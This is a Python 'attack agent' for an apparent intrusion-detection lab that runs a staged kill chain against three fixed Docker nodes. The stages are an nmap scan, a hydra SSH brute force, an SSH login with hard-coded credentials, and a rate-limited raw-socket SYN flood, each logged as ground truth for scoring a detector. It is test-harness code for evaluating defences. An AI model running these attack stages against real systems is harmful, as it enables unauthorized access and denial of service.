"""
Attack Agent (Person A)

Runs a multi-stage kill chain against the edge nodes:
    port_scan -> brute_force -> lateral_movement -> ddos

Every action must be appended to the ground truth file with an exact
timestamp -- this file is what Person D's Evaluation Module scores against,
so accuracy here matters more than anywhere else in the project.
"""

import os
import time
import json
import random
import socket as pysocket
import threading
import subprocess
import xml.etree.ElementTree as ET
from datetime import datetime, timezone

import paramiko
from scapy.all import IP, TCP

GROUND_TRUTH_PATH = "/data/ground_truth.jsonl"
WORDLIST_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlist.txt")

# Fixed IPs from docker-compose.yml -- keep this in sync if those ever change.
NODE_IPS = {
    "172.28.0.11": "edge-node-1",
    "172.28.0.12": "edge-node-2",
    "172.28.0.13": "edge-node-3",
}


def log_ground_truth(stage: str, target: str, detail: str = ""):
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "stage": stage,
        "target": target,
        "detail": detail,
    }
    with open(GROUND_TRUTH_PATH, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(f"[attack-agent] {entry}")


# ---------------------------------------------------------------------------
# Stage 1: Port Scan (reconnaissance across the whole subnet)
# ---------------------------------------------------------------------------

def parse_nmap_xml(xml_text: str) -> dict:
    root = ET.fromstring(xml_text)
    results = {}
    for host in root.findall("host"):
        addr_el = host.find("address")
        if addr_el is None:
            continue
        ip = addr_el.get("addr")

        open_ports = []
        ports_el = host.find("ports")
        if ports_el is not None:
            for port in ports_el.findall("port"):
                state = port.find("state")
                if state is not None and state.get("state") == "open":
                    open_ports.append(int(port.get("portid")))
        results[ip] = open_ports
    return results


def run_port_scan(targets: list, top_ports: int = 1000) -> dict:
    print(f"[attack-agent] starting port_scan against {targets}")
    cmd = ["nmap", "-sS", "-p", f"1-{top_ports}", "-oX", "-", *targets]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

    if result.returncode != 0:
        print(f"[attack-agent] nmap failed: {result.stderr}")
        return {}

    open_ports_by_ip = parse_nmap_xml(result.stdout)

    for ip in targets:
        node_name = NODE_IPS.get(ip, ip)
        log_ground_truth(
            stage="port_scan",
            target=node_name,
            detail=f"open_ports={open_ports_by_ip.get(ip, [])}",
        )

    return open_ports_by_ip


# ---------------------------------------------------------------------------
# Stage 2: Brute Force (focused attack on one target with SSH open)
# ---------------------------------------------------------------------------

def pick_brute_force_target(open_ports_by_ip: dict) -> str:
    for ip, ports in open_ports_by_ip.items():
        if 22 in ports:
            return ip
    return None


def run_brute_force(target_ip: str, username: str = "admin") -> bool:
    node_name = NODE_IPS.get(target_ip, target_ip)
    print(f"[attack-agent] starting brute_force against {node_name} ({target_ip})")

    cmd = [
        "hydra",
        "-l", username,
        "-P", WORDLIST_PATH,
        "-t", "4",
        "-f",
        "-V",
        f"ssh://{target_ip}",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    output = result.stdout + result.stderr
    succeeded = "1 valid password found" in output or "successfully" in output.lower()

    with open(WORDLIST_PATH) as f:
        num_passwords = sum(1 for _ in f)

    log_ground_truth(
        stage="brute_force",
        target=node_name,
        detail=f"username={username} attempts={num_passwords} succeeded={succeeded}",
    )

    return succeeded


# ---------------------------------------------------------------------------
# Stage 3: Lateral Movement (pivot to a different node using "found" creds)
# ---------------------------------------------------------------------------

def pick_lateral_target(open_ports_by_ip: dict, already_targeted_ip: str) -> str:
    for ip, ports in open_ports_by_ip.items():
        if ip != already_targeted_ip and 22 in ports:
            return ip
    return None


def run_lateral_movement(source_ip: str, target_ip: str,
                          found_username: str = "admin",
                          found_password: str = "admin123") -> bool:
    source_node = NODE_IPS.get(source_ip, source_ip)
    target_node = NODE_IPS.get(target_ip, target_ip)
    print(f"[attack-agent] starting lateral_movement: pivoting from {source_node} "
          f"to {target_node} using credentials found on {source_node}")

    succeeded = False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, username=found_username, password=found_password, timeout=5)
        succeeded = True
        client.close()
    except paramiko.AuthenticationException:
        succeeded = False  # expected -- no real account exists on the edge nodes yet
    except Exception as e:
        print(f"[attack-agent] lateral_movement connection error: {e}")
        succeeded = False

    log_ground_truth(
        stage="lateral_movement",
        target=target_node,
        detail=f"pivoted_from={source_node} username={found_username} succeeded={succeeded}",
    )
    return succeeded

# ---------------------------------------------------------------------------
# Stage 4: DDoS (rate-limited, time-boxed SYN flood across all nodes)
# ---------------------------------------------------------------------------

DDOS_DURATION_SECONDS = 10
DDOS_RATE_PPS = 50  # packets per second, per target -- capped for safety


def flood_target(target_ip: str, duration: int, rate: int, counts: dict):
    """
    Sends a rate-limited stream of TCP SYN packets to port 22 (the one port
    we know is actually open) for `duration` seconds. This is a SYN flood --
    the classic DDoS technique of overwhelming a target's half-open
    connection queue by never completing the handshake.

    We open ONE raw socket and reuse it for every packet -- scapy's send()
    opens and closes a fresh socket on every call, which is expensive enough
    that it silently throttled us to ~15pps even when we asked for 50pps.
    Reusing the socket removes that overhead so the achieved rate actually
    matches the requested rate.
    """
    interval = 1.0 / rate
    end_time = time.time() + duration
    sent = 0

    raw_sock = pysocket.socket(pysocket.AF_INET, pysocket.SOCK_RAW, pysocket.IPPROTO_TCP)
    raw_sock.setsockopt(pysocket.IPPROTO_IP, pysocket.IP_HDRINCL, 1)

    try:
        while time.time() < end_time:
            iter_start = time.time()
            pkt = IP(dst=target_ip) / TCP(dport=22, flags="S", sport=random.randint(1024, 65535))
            raw_sock.sendto(bytes(pkt), (target_ip, 0))
            sent += 1

            # Only sleep for whatever time is left after accounting for how
            # long building + sending the packet actually took -- this is
            # what makes the achieved rate match the configured rate.
            elapsed = time.time() - iter_start
            remaining = interval - elapsed
            if remaining > 0:
                time.sleep(remaining)
    finally:
        raw_sock.close()

    counts[target_ip] = sent


def run_ddos(targets: list, duration: int = DDOS_DURATION_SECONDS, rate: int = DDOS_RATE_PPS):
    """
    Stage 4 (final) of the kill chain: floods all targets at once, in
    parallel threads, for a fixed short duration. This is the "Impact"
    stage in MITRE terms -- the attacker no longer cares about staying
    quiet, so hitting everything at once is realistic here, unlike the
    earlier stealthier stages.
    """
    print(f"[attack-agent] starting ddos against {targets} "
          f"(rate={rate}pps/target, duration={duration}s)")

    counts = {}
    threads = [
        threading.Thread(target=flood_target, args=(ip, duration, rate, counts))
        for ip in targets
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    for ip in targets:
        node_name = NODE_IPS.get(ip, ip)
        log_ground_truth(
            stage="ddos",
            target=node_name,
            detail=f"packets_sent={counts.get(ip, 0)} rate_pps={rate} duration_s={duration}",
        )


def main():
    time.sleep(10)

    targets = list(NODE_IPS.keys())
    open_ports_by_ip = run_port_scan(targets)

    brute_force_target = pick_brute_force_target(open_ports_by_ip)
    if brute_force_target:
        run_brute_force(brute_force_target)

        lateral_target = pick_lateral_target(open_ports_by_ip, brute_force_target)
        if lateral_target:
            run_lateral_movement(brute_force_target, lateral_target)
        else:
            print("[attack-agent] no other SSH-open node found, skipping lateral_movement stage")
    else:
        print("[attack-agent] no SSH-open target found, skipping brute_force and lateral_movement stages")

    run_ddos(targets)

    print("[attack-agent] full kill chain complete (port_scan -> brute_force -> "
          "lateral_movement -> ddos). Idling.")
    while True:
        time.sleep(30)

if __name__ == "__main__":
    main()